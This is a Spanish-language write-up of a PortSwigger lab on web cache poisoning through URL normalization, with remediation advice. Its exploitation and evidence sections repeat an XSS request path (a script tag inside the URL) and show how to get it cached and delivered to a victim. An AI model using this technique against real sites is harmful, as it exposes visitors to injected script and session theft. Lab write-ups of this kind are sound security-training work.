@@ -1,0 +1,405 @@
+# Web Cache Poisoning via URL Normalization
+
+**Lab:** Web Cache Poisoning via URL Normalization  
+**Plataforma:** PortSwigger Web Security Academy  
+**Categoría:** Web Cache Poisoning  
+**Dificultad:** Practitioner  
+**Estado:** Resuelto
+
+---
+
+# Índice
+
+1. Resumen ejecutivo
+2. Clasificación de la vulnerabilidad
+3. Información de la vulnerabilidad
+4. Activo afectado
+5. Descripción técnica
+6. Metodología
+7. Identificación de la vulnerabilidad
+8. Explotación
+9. Evidencias
+10. Análisis de impacto
+11. Causa raíz
+12. Recomendaciones
+13. Referencias
+14. Conclusiones
+
+---
+
+# 1. Resumen ejecutivo
+
+La aplicación es vulnerable a **Web Cache Poisoning** debido a una discrepancia entre la forma en que el servidor de caché y el backend interpretan la URL solicitada.
+
+El backend procesa literalmente la ruta enviada por el cliente y refleja su contenido en la respuesta de error, mientras que el sistema de caché normaliza la URL utilizada como clave de almacenamiento. Esta diferencia permite almacenar una respuesta que contiene código JavaScript arbitrario y hacer que posteriormente sea servida a otros usuarios que soliciten la misma URL ya normalizada.
+
+Como resultado, es posible ejecutar un **Cross-Site Scripting (XSS)** persistente mediante el envenenamiento de la caché.
+
+---
+
+# 2. Clasificación de la vulnerabilidad
+
+| Clasificación | Valor |
+|---------------|-------|
+| Tipo | Web Cache Poisoning |
+| Subtipo | URL Normalization |
+| Impacto | Cross-Site Scripting Persistente |
+| Severidad | Alta |
+| CWE | CWE-444 |
+| OWASP | A05 – Security Misconfiguration |
+
+---
+
+# 3. Información de la vulnerabilidad
+
+## Vulnerabilidad
+
+Web Cache Poisoning mediante normalización de URL.
+
+## Técnica
+
+El backend refleja la ruta solicitada sin realizar un escape adecuado del contenido HTML, mientras que el servidor de caché utiliza una versión normalizada de la URL como cache key.
+
+Esta diferencia permite que una petición enviada desde Burp y otra enviada desde el navegador compartan la misma entrada de caché, aunque la segunda llegue completamente codificada.
+
+---
+
+# 4. Activo afectado
+
+Todas las rutas inexistentes de la aplicación.
+
+Ejemplo:
+
+```
+/random
+```
+
+---
+
+# 5. Descripción técnica
+
+Cuando se solicita una ruta inexistente, el servidor responde con un mensaje de error similar a:
+
+```html
+<p>Not Found: /random</p>
+```
+
+El contenido de la ruta es reflejado directamente dentro del HTML.
+
+Por ejemplo, enviando:
+
+```http
+GET /random</p><script>alert(1)</script><p>foo
+```
+
+la respuesta pasa a contener:
+
+```html
+<p>Not Found: /random</p><script>alert(1)</script><p>foo</p>
+```
+
+Si esta URL se introduce directamente en el navegador, el payload no se ejecuta porque el navegador codifica automáticamente los caracteres especiales:
+
+```
+/random%3C/p%3E...
+```
+
+Sin embargo, el sistema de caché normaliza dicha URL y devuelve la respuesta previamente almacenada, que contiene el payload sin codificar.
+
+Como consecuencia, el navegador interpreta el HTML recibido y ejecuta el JavaScript inyectado.
+
+---
+
+# 6. Metodología
+
+1. Identificar una ruta inexistente.
+2. Confirmar que la ruta solicitada se refleja en la respuesta.
+3. Insertar un payload XSS dentro de la propia ruta.
+4. Almacenar la respuesta manipulada en caché.
+5. Acceder a la misma URL desde el navegador.
+6. Confirmar la ejecución del JavaScript.
+7. Enviar la URL a la víctima.
+
+---
+
+# 7. Identificación de la vulnerabilidad
+
+## 7.1 Reflexión de la ruta
+
+Solicitud:
+
+```http
+GET /random HTTP/1.1
+```
+
+Respuesta:
+
+```html
+<p>Not Found: /random</p>
+```
+
+Se confirma que la ruta solicitada es reflejada en el HTML.
+
+---
+
+## 7.2 Inserción del payload
+
+Solicitud:
+
+```http
+GET /random</p><script>alert(1)</script><p>foo HTTP/1.1
+```
+
+Respuesta:
+
+```html
+<p>Not Found: /random</p><script>alert(1)</script><p>foo</p>
+```
+
+El payload aparece reflejado sin ningún tipo de sanitización.
+
+---
+
+## 7.3 Comportamiento del navegador
+
+Al abrir directamente la URL anterior desde el navegador, éste transforma automáticamente la petición en:
+
+```
+/random%3C/p%3E%3Cscript%3E...
+```
+
+En consecuencia, inicialmente el payload no se ejecuta.
+
+---
+
+## 7.4 Normalización de la caché
+
+Tras almacenar previamente la respuesta manipulada desde Burp Suite, la petición realizada por el navegador obtiene la respuesta cacheada.
+
+El HTML recibido vuelve a contener:
+
+```html
+<p>Not Found: /random</p>
+<script>alert(1)</script>
+<p>foo</p>
+```
+
+provocando la ejecución del JavaScript.
+
+---
+
+# 8. Explotación
+
+## Paso 1
+
+Enviar la siguiente petición desde Burp Repeater:
+
+```http
+GET /random</p><script>alert(1)</script><p>foo HTTP/1.1
+Host: <LAB>
+```
+
+---
+
+## Paso 2
+
+Repetir la petición hasta obtener una respuesta cacheada.
+
+Cabeceras observadas:
+
+```
+X-Cache: hit
+```
+
+---
+
+## Paso 3
+
+Abrir la misma URL desde el navegador:
+
+```
+https://<LAB>/random</p><script>alert(1)</script><p>foo
+```
+
+El navegador codifica automáticamente la URL antes de enviarla.
+
+---
+
+## Paso 4
+
+El sistema de caché devuelve la respuesta previamente almacenada.
+
+El navegador recibe:
+
+```html
+<p>Not Found: /random</p>
+<script>alert(1)</script>
+<p>foo</p>
+```
+
+---
+
+## Paso 5
+
+El navegador ejecuta:
+
+```javascript
+alert(1);
+```
+
+---
+
+## Paso 6
+
+Antes de expirar la entrada de caché, se envía nuevamente la petición maliciosa y posteriormente se utiliza la funcionalidad **Deliver link to victim** para completar el laboratorio.
+
+---
+
+# 9. Evidencias
+
+## Petición maliciosa
+
+```http
+GET /random</p><script>alert(1)</script><p>foo HTTP/1.1
+```
+
+---
+
+## Respuesta obtenida
+
+```html
+<p>Not Found: /random</p>
+<script>alert(1)</script>
+<p>foo</p>
+```
+
+---
+
+## Cabeceras de caché
+
+```
+Cache-Control: max-age=10
+
+X-Cache: hit
+```
+
+---
+
+## Ejecución
+
+Al abrir la URL en el navegador apareció:
+
+```
+alert(1)
+```
+
+Tras cerrar el cuadro de diálogo, la página mostraba:
+
+```
+Not Found: /random
+
+foo
+```
+
+---
+
+## Confirmación
+
+Después de enviar la URL mediante **Deliver link to victim**, el laboratorio quedó marcado como:
+
+```
+Lab Solved
+```
+
+---
+
+# 10. Análisis de impacto
+
+Un atacante puede conseguir que la caché almacene una respuesta HTML manipulada.
+
+Todos los usuarios que posteriormente accedan a la misma URL recibirán dicha respuesta, provocando la ejecución automática del JavaScript inyectado.
+
+Las consecuencias incluyen:
+
+- Robo de sesiones.
+- Robo de credenciales.
+- Robo de tokens CSRF.
+- Captura de información sensible.
+- Redirección a sitios maliciosos.
+- Keylogging.
+- Modificación del contenido mostrado al usuario.
+
+Al tratarse de un recurso cacheado, el ataque afecta potencialmente a múltiples víctimas sin necesidad de interactuar directamente con ellas.
+
+---
+
+# 11. Causa raíz
+
+La vulnerabilidad es consecuencia de la combinación de varios errores de diseño:
+
+- La ruta solicitada se refleja sin sanitización.
+- El backend interpreta literalmente la URL recibida.
+- El navegador codifica automáticamente los caracteres especiales.
+- El sistema de caché utiliza una versión normalizada de la URL para construir la cache key.
+- Backend y caché interpretan de forma distinta la misma petición.
+
+Esta discrepancia permite reutilizar una respuesta cacheada distinta de la que realmente espera el backend.
+
+---
+
+# 12. Recomendaciones
+
+## Prioridad crítica
+
+Escapar correctamente cualquier dato reflejado dentro del HTML.
+
+---
+
+## Prioridad alta
+
+Aplicar exactamente la misma normalización de URL tanto en el backend como en el sistema de caché.
+
+---
+
+## Prioridad alta
+
+No almacenar respuestas que dependan directamente de datos proporcionados por el usuario.
+
+---
+
+## Prioridad alta
+
+Configurar la cache key considerando exactamente la representación utilizada por el backend.
+
+---
+
+## Prioridad media
+
+Implementar una política CSP restrictiva para reducir el impacto de posibles XSS.
+
+---
+
+## Prioridad media
+
+Auditar todas las respuestas de error que reflejen datos procedentes de la URL.
+
+---
+
+# 13. Referencias
+
+- PortSwigger Web Security Academy – Web Cache Poisoning
+- PortSwigger – URL Normalization
+- RFC 3986 – Uniform Resource Identifier (URI)
+- RFC 7234 – HTTP Caching
+- OWASP Web Cache Poisoning
+- CWE-444
+
+---
+
+# 14. Conclusiones
+
+Este laboratorio demuestra cómo una diferencia en la normalización de las URL entre el servidor de caché y el backend puede convertirse en una vulnerabilidad crítica.
+
+Aunque el navegador codifica automáticamente los caracteres especiales al enviar la petición, el sistema de caché reutiliza una respuesta previamente almacenada que contiene el payload sin codificar. Como resultado, el navegador recibe un documento HTML válido que incluye código JavaScript arbitrario y lo ejecuta automáticamente.
+
+Este tipo de discrepancias entre los distintos componentes de una infraestructura web constituye una de las causas más habituales de **Web Cache Poisoning**, permitiendo convertir un XSS reflejado en un XSS persistente distribuido a través de la caché.
